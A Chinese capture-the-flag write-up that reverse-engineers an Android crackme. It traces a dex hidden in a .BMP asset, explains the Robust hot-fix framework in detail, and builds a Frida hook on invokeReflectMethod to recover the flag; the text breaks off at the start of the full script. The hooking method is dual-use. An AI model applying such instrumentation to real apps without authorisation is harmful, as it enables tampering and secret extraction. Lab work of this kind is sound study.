接下来定位到MainActivity的onCreate()方法，可以看到一些可以的变量和方法比如～～上PatchProxy，changeQuickRedirectd等 同时看到在else中调用了this.runRobust()方法，并且在每个类中都会存在一些changeQuickRedirect变量，以及isSupport()，accessDispatch()方法。 12345678910111213141516171819202122232425private void runRobust() { int v4 = 4; Object[] v0 = new Object[0]; ChangeQuickRedirect v2 = MainActivity.changeQuickRedirect; Class[] v5 = new Class[0]; Class v6 = Void.TYPE; MainActivity v1 = this; boolean v0_1 = PatchProxy.isSupport(v0, v1, v2, false, v4, v5, v6); if(v0_1) { v0 = new Object[0]; v2 = MainActivity.changeQuickRedirect; v5 = new Class[0]; v6 = Void.TYPE; v1 = this; PatchProxy.accessDispatch(v0, v1, v2, false, v4, v5, v6); } else { Context v1_1 = this.getApplicationContext(); //实例化PatchManipulateImp类 PatchManipulateImp v2_1 = new PatchManipulateImp(); //实例化PatchExecutor类 PatchExecutor v0_2 = new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack()); v0_2.start(); }} 在runRobust()方法的else中实例化了两个对象跟进第一个PatchMainpulateImp中 发现在fetchPatchList()方法中 调用了arg17.getAssets().open(**&quot;GeekTan.BMP&quot;**);从资源文件夹中，还在了一个BMP的的图片文件，并将BMP文件内容写入GeekTan.jar中 具体代码如下： 12345678910111213141516171819202122232425262728293031323334 try { v10 = arg17.getAssets().open(&quot;GeekTan.BMP&quot;); v8 = new File(arg17.getCacheDir() + File.separator + &quot;GeekTan&quot; + File.separator + &quot;GeekTan.jar&quot;); if(!v8.getParentFile().exists()) { v8.getParentFile().mkdirs(); } } catch(Exception v9) { goto label_171; }//将v8通过FileOutputStream方法赋值v12 try { v12 = new FileOutputStream(v8); } catch(Throwable v0_3) { goto label_17; } int v0_4 = 0x400; try { byte[] v7 = new byte[v0_4]; while(true) { //v10给v11赋值 v10是GeekTan.BMP int v11 = v10.read(v7); if(v11 &lt;= 0) { break; }//最终写入到v12中，而v12是new FileOutputStream(v8); ((OutputStream)v12).write(v7, 0, v11); } } catch(Throwable v0_3) { goto label_88; } 查看对应的BMP文件发现是一个压缩包，里面存在一个dex文件 12╰─$ file GeekTan.BMPGeekTan.BMP: Zip archive data, at least v2.0 to extract 123456╰─$ binwalk GeekTan.BMPDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 Zip archive data, at least v2.0 to extract, name: classes.dex11635 0x2D73 End of Zip archive, footer length: 22 同时在fetchPatchList()方法中实例化一个Patch对象 1Patch v13 = new Patch(); 在方法的最后调用 12v0_6 = &quot;cn.chaitin.geektan.crackme.PatchesInfoImpl&quot;;v13.setPatchesInfoImplClassFullName(v0_6); 然后到runRobust()，接下来实例化了PatchExecutor类，可以看到第二个参数就是PatchManipulateImp类的实例 12345Context v1_1 = this.getApplicationContext(); //实例化PatchManipulateImp类 PatchManipulateImp v2_1 = new PatchManipulateImp(); //实例化PatchExecutor类 PatchExecutor v0_2 = new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack()); 这个PatchExecutor类是在com.meituan.robust包下的，是一个第三方包，目前美团官方已经将其开源，在此暂停上面的分析，简单学习一下Robust。 Robust热修复框架原理 Robust是美团推出的一款热修复框架，可以在github上面下载它的最新的源码 Robust的基本原理，主要从下面4个步骤进行学习 1.将APK代码中每个函数都在编译打包阶段自动插入一段代码例如，原函数： 123public long getIndex(){ return 100;} 他会被处理成这样： 123456789101112//在该类中声明一个接口变量changeQuickRedirectpublic static ChangeQuickRedirect changeQuickRedirect;//在要修复的方法中添加以下逻辑代码 public long getIndex() { if(changeQuickRedirect != null) { //PatchProxy中封装了获取当前className和methodName的逻辑，并在其内部最终调用了changeQuickRedirect的对应函数 if(PatchProxy.isSupport(new Object[0], this, changeQuickRedirect, false)) { return ((Long)PatchProxy.accessDispatch(new Object[0], this, changeQuickRedirect, false)).longValue(); } } return 100L; } Robust为每个class增加了个类型为ChangeQuickRedirect的静态成员 每个方法前都插入了使用changeQuickRedirect相关的逻辑 当changeQuickRedirect不为null时，会执行到accessDispatch方法从而替换掉之前老的逻辑，达到修复的目的。 2.生成需要修复的类及方法的类文件并打包成dex接下来你可能已经将需要修复的类及方法写好了，这个时候调用Robust的autopatch文件夹中的类及方法会生成如下主要文件：PatchesInfoImpl.java，xxxPatchControl.java（其中xxx为原类的名字）。 PatchesInfoImpl.java的内是由PatchesInfoFactory类的createPatchesInfoClass生成的，这是它生成PatchesInfoImpl逻辑，可以看到，这个类其实是用拼接得到的。 具体代码如下 1234567891011121314151617181920212223242526272829private CtClass creatxePatchesInfoClass() { try { //创建PatchesInfoImpl类 CtClass ctPatchesInfoImpl = classPool.makeClass(Config.patchPackageName + &quot;.PatchesInfoImpl&quot;); ctPatchesInfoImpl.getClassFile().setMajorVersion(ClassFile.JAVA_7); ctPatchesInfoImpl.setInterfaces(new CtClass[]{classPool.get(&quot;com.meituan.robust.PatchesInfo&quot;)}); StringBuilder methodBody = new StringBuilder(); //拼接类中的内容 methodBody.append(&quot;public java.util.List getPatchedClassesInfo() {&quot;); methodBody.append(&quot; java.util.List patchedClassesInfos = new java.util.ArrayList();&quot;); for (int i = 0; i &lt; Config.modifiedClassNameList.size(); i++) { if (Constants.OBSCURE) { methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; = new com.meituan.robust.PatchedClassInfo(\\&quot;&quot; + ReadMapping.getInstance().getClassMappingOrDefault(Config.modifiedClassNameList.get(i)).getValueName() + &quot;\\&quot;,\\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf('.') + 1)) + &quot;\\&quot;);&quot;); } else { methodBody.append(&quot;com.meituan.robust.PatchedClassInfo patchedClass&quot; + i + &quot; = new com.meituan.robust.PatchedClassInfo(\\&quot;&quot; + Config.modifiedClassNameList.get(i) + &quot;\\&quot;,\\&quot;&quot; + NameManger.getInstance().getPatchControlName(Config.modifiedClassNameList.get(i).substring(Config.modifiedClassNameList.get(i).lastIndexOf('.') + 1)) + &quot;\\&quot;);&quot;); } methodBody.append(&quot;patchedClassesInfos.add(patchedClass&quot; + i + &quot;);&quot;); } methodBody.append(Constants.ROBUST_UTILS_FULL_NAME + &quot;.isThrowable=!&quot; + Config.catchReflectException + &quot;;&quot;); methodBody.append(&quot;return patchedClassesInfos;\\n&quot; + &quot; }&quot;); CtMethod m = make(methodBody.toString(), ctPatchesInfoImpl); ctPatchesInfoImpl.addMethod(m); return ctPatchesInfoImpl; } catch (Exception e) { e.printStackTrace(); throw new RuntimeException(e); }} 生成的PatchesInfoImpl类型及类内容如下 12345678910public class PatchesInfoImpl implements PatchesInfo { public List getPatchedClassesInfo() { List arrayList = new ArrayList(); //PatchedClassInfo(&quot;原来的类&quot;,&quot;修复后的类control&quot;); arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;, &quot;cn.chaitin.geektan.crackme.MainActivityPatchControl&quot;)); arrayList.add(new PatchedClassInfo(&quot;cn.chaitin.geektan.crackme.MainActivity$1&quot;, &quot;cn.chaitin.geektan.crackme.MainActivity$1PatchControl&quot;)); EnhancedRobustUtils.isThrowable = false; return arrayList; }} 另外还会生成一个xxxPatchControl类，通过PatchesControlFactory的createControlClass()方法生成，具体的逻辑和生成PatchesInfoImpl类类似,其中每个Control类中都存在以下静态成员变量和方法。 1234567891011121314151617private CtClass createControlClass(CtClass modifiedClass) throws Exception { CtClass patchClass = classPool.get(NameManger.getInstance().getPatchName(modifiedClass.getName())); patchClass.defrost(); CtClass controlClass = classPool.getAndRename(Constants.PATCH_TEMPLATE_FULL_NAME, NameManger.getInstance().getPatchControlName(modifiedClass.getSimpleName())); StringBuilder getRealParameterMethodBody = new StringBuilder(); getRealParameterMethodBody.append(&quot;public Object getRealParameter(Object parameter) {&quot;); getRealParameterMethodBody.append(&quot;if(parameter instanceof &quot; + modifiedClass.getName() + &quot;){&quot;); getRealParameterMethodBody. append(&quot;return new &quot; + patchClass.getName() + &quot;(parameter);&quot;); getRealParameterMethodBody.append(&quot;}&quot;); getRealParameterMethodBody.append(&quot;return parameter;}&quot;); controlClass.addMethod(CtMethod.make(getRealParameterMethodBody.toString(), controlClass)); controlClass.getDeclaredMethod(&quot;accessDispatch&quot;).insertBefore(getAccessDispatchMethodBody(patchClass, modifiedClass.getName())); controlClass.getDeclaredMethod(&quot;isSupport&quot;).insertBefore(getIsSupportMethodBody(patchClass, modifiedClass.getName())); controlClass.defrost(); return controlClass; } 将含有PatchesInfoImpl.java和xxxPatchControl.java,以及xxxPatch.java（具体修复的类）打包成dex文件。 12345678910111213141516171819202122public class xxxPatchControl implements ChangeQuickRedirect{ public static final String MATCH_ALL_PARAMETER = &quot;(\\\\w*\\\\.)*\\\\w*&quot;; private static final Map&lt;Object, Object&gt; keyToValueRelation = new WeakHashMap(); //获取函数的参数的方法public Object getRealParameter(Object obj){..具体逻辑..} //判断是否支持修复public boolean isSupport(String methodName, Object[] paramArrayOfObject){..具体逻辑.} //执行到accessDispatch方法替换旧的类方法public Object accessDispatch(String methodName, Object[] paramArrayOfObject) {.具体逻辑..}} //解决boolean被优化成byte的问题private static Object fixObj(Object booleanObj) {.具体逻辑..} } 3.加载动态dex文件，以反射的方式修改替换旧类回到我们刚刚分析的地方，跟进PatchExecutor类看看。 12345678910111213public void run() { try { //拉取补丁列表 List&lt;Patch&gt; patches = fetchPatchList(); //应用补丁列表 applyPatchList(patches); } catch (Throwable t) { Log.e(&quot;robust&quot;, &quot;PatchExecutor run&quot;, t); robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor,method:run,line:36&quot;); }}...} 在run方法中，主要做了2件事。 1.获取补丁列表12345ist&lt;Patch&gt; patches = fetchPatchList();//PatchManipulateImp类的fetchPatchList方法protected List&lt;Patch&gt; fetchPatchList() { return patchManipulate.fetchPatchList(context); } 2.应用补丁123456789101112131415161718192021222324252627282930313233343536applyPatchList(patches); protected void applyPatchList(List&lt;Patch&gt; patches) { if (null == patches || patches.isEmpty()) { return; } Log.d(&quot;robust&quot;, &quot; patchManipulate list size is &quot; + patches.size()); for (Patch p : patches) { if (p.isAppliedSuccess()) { Log.d(&quot;robust&quot;, &quot;p.isAppliedSuccess() skip &quot; + p.getLocalPath()); continue; } if (patchManipulate.ensurePatchExist(p)) { boolean currentPatchResult = false; try { //真正应用补丁的方法patch() currentPatchResult = patch(context, p); } catch (Throwable t) { robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:applyPatchList line:69&quot;); } if (currentPatchResult) { //设置patch 状态为成功 p.setAppliedSuccess(true); //统计PATCH成功率 PATCH成功 robustCallBack.onPatchApplied(true, p); } else { //统计PATCH成功率 PATCH失败 robustCallBack.onPatchApplied(false, p); } Log.d(&quot;robust&quot;, &quot;patch LocalPath:&quot; + p.getLocalPath() + &quot;,apply result &quot; + currentPatchResult); } } } 跟进patch()进行分析 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889protected boolean patch(Context context, Patch patch) { //验证patch的hash if (!patchManipulate.verifyPatch(context, patch)) { robustCallBack.logNotify(&quot;verifyPatch failure, patch info:&quot; + &quot;id = &quot; + patch.getName() + &quot;,md5 = &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:107&quot;); return false; } //调用DexClassLoader动态加载dex DexClassLoader classLoader = new DexClassLoader(patch.getTempPath(), context.getCacheDir().getAbsolutePath(), null, PatchExecutor.class.getClassLoader()); patch.delete(patch.getTempPath()); Class patchClass, oldClass; Class patchsInfoClass; PatchesInfo patchesInfo = null; try { //动态加载PatchesInfoImpl，获取要patch的类 patchsInfoClass = classLoader.loadClass(patch.getPatchesInfoImplClassFullName()); patchesInfo = (PatchesInfo) patchsInfoClass.newInstance(); Log.d(&quot;robust&quot;, &quot;PatchsInfoImpl ok&quot;); } catch (Throwable t) { robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:108&quot;); Log.e(&quot;robust&quot;, &quot;PatchsInfoImpl failed,cause of&quot; + t.toString()); t.printStackTrace(); } if (patchesInfo == null) { robustCallBack.logNotify(&quot;patchesInfo is null, patch info:&quot; + &quot;id = &quot; + patch.getName() + &quot;,md5 = &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:114&quot;); return false; } //classes need to patch //获取要打补丁的类patchedClasses List&lt;PatchedClassInfo&gt; patchedClasses = patchesInfo.getPatchedClassesInfo(); if (null == patchedClasses || patchedClasses.isEmpty()) { robustCallBack.logNotify(&quot;patchedClasses is null or empty, patch info:&quot; + &quot;id = &quot; + patch.getName() + &quot;,md5 = &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:122&quot;); return false; } //循环类名，将patchedClasses中的类打补丁 for (PatchedClassInfo patchedClassInfo : patchedClasses) { String patchedClassName = patchedClassInfo.patchedClassName; String patchClassName = patchedClassInfo.patchClassName; if (TextUtils.isEmpty(patchedClassName) || TextUtils.isEmpty(patchClassName)) { robustCallBack.logNotify(&quot;patchedClasses or patchClassName is empty, patch info:&quot; + &quot;id = &quot; + patch.getName() + &quot;,md5 = &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:131&quot;); continue; } Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName); try { //将oldClass的changeQuickRedirectField的值设置为null oldClass = classLoader.loadClass(patchedClassName.trim()); Field[] fields = oldClass.getDeclaredFields(); Log.d(&quot;robust&quot;, &quot;oldClass :&quot; + oldClass + &quot; fields &quot; + fields.length); Field changeQuickRedirectField = null; for (Field field : fields) { if (TextUtils.equals(field.getType().getCanonicalName(), ChangeQuickRedirect.class.getCanonicalName()) &amp;&amp; TextUtils.equals(field.getDeclaringClass().getCanonicalName(), oldClass.getCanonicalName())) { changeQuickRedirectField = field; break; } } if (changeQuickRedirectField == null) { robustCallBack.logNotify(&quot;changeQuickRedirectField is null, patch info:&quot; + &quot;id = &quot; + patch.getName() + &quot;,md5 = &quot; + patch.getMd5(), &quot;class:PatchExecutor method:patch line:147&quot;); Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; something wrong !! can not find:ChangeQuickRedirect in&quot; + patchClassName); continue; } Log.d(&quot;robust&quot;, &quot;current path:&quot; + patchedClassName + &quot; find:ChangeQuickRedirect &quot; + patchClassName); try { //动态加载补丁类 patchClass = classLoader.loadClass(patchClassName); Object patchObject = patchClass.newInstance(); changeQuickRedirectField.setAccessible(true); //将它的changeQuickRedirectField设置为patchObject实例。 changeQuickRedirectField.set(null, patchObject); Log.d(&quot;robust&quot;, &quot;changeQuickRedirectField set sucess &quot; + patchClassName); } catch (Throwable t) { Log.e(&quot;robust&quot;, &quot;patch failed! &quot;); t.printStackTrace(); robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:163&quot;); } } catch (Throwable t) { Log.e(&quot;robust&quot;, &quot;patch failed! &quot;); t.printStackTrace(); robustCallBack.exceptionNotify(t, &quot;class:PatchExecutor method:patch line:169&quot;); } } Log.d(&quot;robust&quot;, &quot;patch finished &quot;); return true; } 4.isSupport和accessDispatch我们再来看看onCreate()中的代码，虽然混淆后代码看起来很冗长，但是通过刚刚对Robust原理的简单分析，现在已经可以清晰的知道，这其实就是isSupport()和accessDispatch()。 1234567891011121314151617181920212223242526public void onCreate(Bundle arg13) { int v4 = 3; Object[] v0 = new Object[1]; v0[0] = arg13; ChangeQuickRedirect v2 = MainActivity.changeQuickRedirect; Class[] v5 = new Class[1]; Class v1 = Bundle.class; v5[0] = v1; Class v6 = Void.TYPE; MainActivity v1_1 = this; boolean v0_1 = PatchProxy.isSupport(v0, v1_1, v2, false, v4, v5, v6); if(v0_1) { v0 = new Object[1]; v0[0] = arg13; v2 = MainActivity.changeQuickRedirect; v5 = new Class[1]; v1 = Bundle.class; v5[0] = v1; v6 = Void.TYPE; v1_1 = this; PatchProxy.accessDispatch(v0, v1_1, v2, false, v4, v5, v6); } else { ..... } 123456789101112131415161718192021222324252627282930public static boolean isSupport(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) { //Robust补丁优先执行，其他功能靠后 if (changeQuickRedirect == null) { //不执行补丁，轮询其他监听者 if (registerExtensionList == null || registerExtensionList.isEmpty()) { return false; } for (RobustExtension robustExtension : registerExtensionList) { if (robustExtension.isSupport(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType))) { robustExtensionThreadLocal.set(robustExtension); return true; } } return false; } //获取 classMethod = className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber; String classMethod = getClassMethod(isStatic, methodNumber); if (TextUtils.isEmpty(classMethod)) { return false; } Object[] objects = getObjects(paramsArray, current, isStatic); try { /*调用changeQuickRedirect.isSupport，还记得这个changeQuickRedirect 吗，他是在第3步中changeQuickRedirectField.set(null, patchObject); 得到的补丁类的实例。*/ return changeQuickRedirect.isSupport(classMethod, objects); } catch (Throwable t) { return false; } } 通过上面的分析，可以知道只有当存在补丁的类changeQuickRedirect.isSupport()才会返回值。这个时候我们把刚刚第二步打包的dex反编译看看，我们可以看到在xxxPatchControl类中存在isSupport，它返回的值其实就是methodNumber。 123public boolean isSupport(String methodName, Object[] paramArrayOfObject) { return &quot;18:&quot;.contains(methodName.split(&quot;:&quot;)[3]); } accessDispatch()方法，替换原方法。 123456789101112131415161718192021222324public static Object accessDispatch(Object[] paramsArray, Object current, ChangeQuickRedirect changeQuickRedirect, boolean isStatic, int methodNumber, Class[] paramsClassTypes, Class returnType) { //如果changeQuickRedirect为null... if (changeQuickRedirect == null) { RobustExtension robustExtension = robustExtensionThreadLocal.get(); robustExtensionThreadLocal.remove(); if (robustExtension != null) { notify(robustExtension.describeSelfFunction()); return robustExtension.accessDispatch(new RobustArguments(paramsArray, current, isStatic, methodNumber, paramsClassTypes, returnType)); } return null; } //同样获取 classMethod = className + &quot;:&quot; + methodName + &quot;:&quot; + isStatic + &quot;:&quot; + methodNumber; String classMethod = getClassMethod(isStatic, methodNumber); if (TextUtils.isEmpty(classMethod)) { return null; } notify(Constants.PATCH_EXECUTE); Object[] objects = getObjects(paramsArray, current, isStatic); //返回changeQuickRedirect.accessDispatch。 return changeQuickRedirect.accessDispatch(classMethod, objects); } 具体看看PatchControl类中的accessDispatch。 1234567891011121314151617181920212223242526272829public Object accessDispatch(String methodName, Object[] paramArrayOfObject) { try { MainActivityPatch mainActivityPatch; //判断classMethod的isStatic是否为false，其实在调用accessDispatch传递的就是false。 if (methodName.split(&quot;:&quot;)[2].equals(&quot;false&quot;)) { MainActivityPatch mainActivityPatch2; if (keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]) == null) { mainActivityPatch2 = new MainActivityPatch(paramArrayOfObject[paramArrayOfObject.length - 1]); keyToValueRelation.put(paramArrayOfObject[paramArrayOfObject.length - 1], null); } else { mainActivityPatch2 = (MainActivityPatch) keyToValueRelation.get(paramArrayOfObject[paramArrayOfObject.length - 1]); } mainActivityPatch = mainActivityPatch2; } else { mainActivityPatch = new MainActivityPatch(null); } //根据methodNumber，选取要执行的patch方法。 Object obj = methodName.split(&quot;:&quot;)[3]; if (&quot;3&quot;.equals(obj)) { mainActivityPatch.onCreate((Bundle) paramArrayOfObject[0]); } if (&quot;6&quot;.equals(obj)) { return mainActivityPatch.Joseph(((Integer) paramArrayOfObject[0]).intValue(), ((Integer) paramArrayOfObject[1]).intValue()); } } catch (Throwable th) { th.printStackTrace(); } return null;} Robust的基本原理就是这些了 hook点分析我们对Robust进行分析，现在已经比较清晰的知道了我们需要攻克的难点，它是通过Robust热修复框架将一些方法热修复了，所以我们这里必须知道，它修复了哪些类及方法。 foremost提取assets文件夹下的GeekTan.BMP，得到dex文件直接扔到jadx中进行分析。 123456─$ foremost GeekTan.BMPforemost: /usr/local/etc/foremost.conf: No such file or directoryProcessing: GeekTan.BMP|foundat=classes.dex�,�dex035*| 在PatchesInfoImpl类中可以看到2个要被修复的类信息。 MainActivityPatchControl类，我们看到在accessDispatch()，onCreate()和Joseph()方法将会通过判断ethodNumber来选取。 继续查看MainActivity$1PatchControl类，同样发现onClick被修复了。 所以这个时候，我们必须知道onClick真正执行的逻辑是什么。查看MainActivity$1Patch类中的真正的onClick方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106package cn.chaitin.geektan.crackme;import android.content.Context;import android.text.Editable;import android.text.TextUtils;import android.view.View;import android.widget.EditText;import android.widget.Toast;import cn.chaitin.geektan.crackme.MainActivity;import com.meituan.robust.patch.RobustModify;import com.meituan.robust.utils.EnhancedRobustUtils;public class MainActivity$1Patch { MainActivity.1 originClass; public MainActivity$1Patch(Object obj) { this.originClass = (MainActivity.1) obj; } public Object[] getRealParameter(Object[] objArr) { if (objArr == null || objArr.length &lt; 1) { return objArr; } Object[] objArr2 = new Object[objArr.length]; for (int i = 0; i &lt; objArr.length; i++) { if (objArr[i] == this) { objArr2[i] = this.originClass; } else { objArr2[i] = objArr[i]; } } return objArr2; } public void onClick(View view) { MainActivity$1Patch mainActivity$1Patch; EnhancedRobustUtils.invokeReflectStaticMethod(&quot;modify&quot;, RobustModify.class, getRealParameter(new Object[0]), (Class[]) null); MainActivity.1 r0 = (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class); if (r0 == this) { r0 = ((MainActivity$1Patch) r0).originClass; } if (!((Boolean) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;isEmpty&quot;, TextUtils.class, getRealParameter(new Object[]{(Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r0, new Object[0], (Class[]) null, EditText.class)}), new Class[]{CharSequence.class})).booleanValue()) { MainActivity.1 r02 = (EditText) EnhancedRobustUtils.getFieldValue(&quot;val$input_text&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class); if (r02 == this) { r02 = ((MainActivity$1Patch) r02).originClass; } MainActivity.1 r03 = (Editable) EnhancedRobustUtils.invokeReflectMethod(&quot;getText&quot;, r02, new Object[0], (Class[]) null, EditText.class); if (r03 == this) { r03 = ((MainActivity$1Patch) r03).originClass; } MainActivity.1 r04 = (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r03, new Object[0], (Class[]) null, Object.class); MainActivity.1 r1 = (StringBuilder) EnhancedRobustUtils.invokeReflectConstruct(&quot;java.lang.StringBuilder&quot;, new Object[0], (Class[]) null); if (r1 == this) { r1 = ((MainActivity$1Patch) r1).originClass; } MainActivity.1 r12 = (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r1, getRealParameter(new Object[]{&quot;DDCTF{&quot;}), new Class[]{String.class}, StringBuilder.class); MainActivity.1 r2 = (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class); if (r2 == this) { r2 = ((MainActivity$1Patch) r2).originClass; } String str = (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r2, getRealParameter(new Object[]{new Integer(5), new Integer(6)}), new Class[]{Integer.TYPE, Integer.TYPE}, MainActivity.class); if (r12 == this) { r12 = ((MainActivity$1Patch) r12).originClass; } MainActivity.1 r13 = (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r12, getRealParameter(new Object[]{str}), new Class[]{String.class}, StringBuilder.class); MainActivity.1 r22 = (MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class); if (r22 == this) { r22 = ((MainActivity$1Patch) r22).originClass; } String str2 = (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, r22, getRealParameter(new Object[]{new Integer(7), new Integer(8)}), new Class[]{Integer.TYPE, Integer.TYPE}, MainActivity.class); if (r13 == this) { r13 = ((MainActivity$1Patch) r13).originClass; } MainActivity.1 r14 = (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r13, getRealParameter(new Object[]{str2}), new Class[]{String.class}, StringBuilder.class); if (r14 == this) { r14 = ((MainActivity$1Patch) r14).originClass; } MainActivity.1 r15 = (StringBuilder) EnhancedRobustUtils.invokeReflectMethod(&quot;append&quot;, r14, getRealParameter(new Object[]{&quot;}&quot;}), new Class[]{String.class}, StringBuilder.class); if (r15 == this) { r15 = ((MainActivity$1Patch) r15).originClass; } String str3 = (String) EnhancedRobustUtils.invokeReflectMethod(&quot;toString&quot;, r15, new Object[0], (Class[]) null, StringBuilder.class); if (r04 == this) { r04 = ((MainActivity$1Patch) r04).originClass; } if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, r04, getRealParameter(new Object[]{str3}), new Class[]{Object.class}, String.class)).booleanValue()) { if (this instanceof MainActivity$1Patch) { mainActivity$1Patch = this.originClass; } else { mainActivity$1Patch = this; } MainActivity.1 r05 = (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]{(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, mainActivity$1Patch, MainActivity.1.class), &quot;恭喜大佬！密码正确！&quot;, new Integer(0)}), new Class[]{Context.class, CharSequence.class, Integer.TYPE}); if (r05 == this) { r05 = ((MainActivity$1Patch) r05).originClass; } EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r05, new Object[0], (Class[]) null, Toast.class); return; } } MainActivity.1 r06 = (Toast) EnhancedRobustUtils.invokeReflectStaticMethod(&quot;makeText&quot;, Toast.class, getRealParameter(new Object[]{(MainActivity) EnhancedRobustUtils.getFieldValue(&quot;this$0&quot;, this instanceof MainActivity$1Patch ? this.originClass : this, MainActivity.1.class), &quot;大佬莫急！再试试！&quot;, new Integer(0)}), new Class[]{Context.class, CharSequence.class, Integer.TYPE}); if (r06 == this) { r06 = ((MainActivity$1Patch) r06).originClass; } EnhancedRobustUtils.invokeReflectMethod(&quot;show&quot;, r06, new Object[0], (Class[]) null, Toast.class); }} 分析onClick方法，可以发现很多invokeReflectStaticMethod，getFieldValue，invokeReflectMethod方法，同样我们还能发现flag就在这里面。 1234567//flag是通过append将字符串以及Joseph（int,int）的返回值拼接构成的。String str = &quot;DDCTF{&quot;;str = (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]{new Integer(5), new Integer(6)}), new Class[]{Integer.TYPE, Integer.TYPE}, MainActivity.class);str = (String) EnhancedRobustUtils.invokeReflectMethod(&quot;Joseph&quot;, obj2, getRealParameter(new Object[]{new Integer(7), new Integer(8)}), new Class[]{Integer.TYPE, Integer.TYPE}, MainActivity.class);str = &quot;}&quot;;//最终将我们输入的值与上面构造的equals比较，判断是否准确。if (((Boolean) EnhancedRobustUtils.invokeReflectMethod(&quot;equals&quot;, obj, getRealParameter(new Object[]{str2}), new Class[]{Object.class}, String.class)).booleanValue()) {...} 通过上面的分析，可以发现hook有2个思路： 1.hook EnhancedRobustUtils类下的方法获取方法执行的返回值。2.hook 动态加载的类MainActivityPatch的Joseph方法，直接调用它获取返回值。（下篇） 代码构造先来看看EnhancedRobustUtils类下的方法invokeReflectMethod。 1234567891011121314public static Object invokeReflectMethod(String methodName, Object targetObject, Object[] parameters, Class[] args, Class declaringClass) { try { //可以看到这里是通过反射的方法拿到类实例 Method method = getDeclaredMethod(targetObject, methodName, args, declaringClass); //代入参数，调用方法 return method.invoke(targetObject, parameters); } catch (Exception e) { e.printStackTrace(); } if (isThrowable) { throw new RuntimeException(&quot;invokeReflectMethod error &quot; + methodName + &quot; parameter &quot; + parameters + &quot; targetObject &quot; + targetObject.toString() + &quot; args &quot; + args); } return null; } invokeReflectConstruct 1234567891011121314151617public static Object invokeReflectConstruct(String className, Object[] parameter, Class[] args) { try { //通过Class.forName(className)反射得到一个Class对象 Class clazz = Class.forName(className); //获得构造器 Constructor constructor = clazz.getDeclaredConstructor(args); constructor.setAccessible(true); //返回该类的实例 return constructor.newInstance(parameter); } catch (Exception e) { e.printStackTrace(); } if (isThrowable) { throw new RuntimeException(&quot;invokeReflectConstruct error &quot; + className + &quot; parameter &quot; + parameter); } return null; } 很简单，通过反射得到类的实例及方法，最终通过invoke代入参数执行方法。这里很幸运，我们发现这个EnhancedRobustUtils 是Robust自带的类，并不是动态加载的。那hook就非常简单了，我们只需要简单的hook invokeReflectMethod获取Joseph的返回值，以及equals的参数即可。 1234567891011121314151617181920212223242526Java.perform(function(){//获得EnhancedRobustUtils类的wapper var robust = Java.use(&quot;com.meituan.robust.utils.EnhancedRobustUtils&quot;);//hook invokeReflectMethod方法 robust.invokeReflectMethod.implementation = function(v1,v2,v3,v4,v5){ //不破坏原来的逻辑，只在原来的逻辑中打印出Joseph，equals的值 var result = this.invokeReflectMethod(v1,v2,v3,v4,v5); if(v1==&quot;Joseph&quot;){ console.log(&quot;functionName:&quot;+v1); console.log(&quot;functionArg3:&quot;+v3); console.log(&quot;functionArg4:&quot;+v4); send(v4); console.log(&quot;return:&quot;+result); console.log(&quot;-----------------------------------------------------&quot;) } else if(v1==&quot;equals&quot;){ console.log(&quot;functionName:&quot;+v1); console.log(&quot;functionArg3:&quot;+v3); console.log(&quot;functionArg4:&quot;+v4); send(v4); console.log(&quot;return:&quot;+result); } return result; }}); 完整代码： 12345678910111213141516171819202122232425262728293031323334353637383940# -*- coding: UTF-8 -*-import frida,sysdef on_message(message, data): if message['type'] == 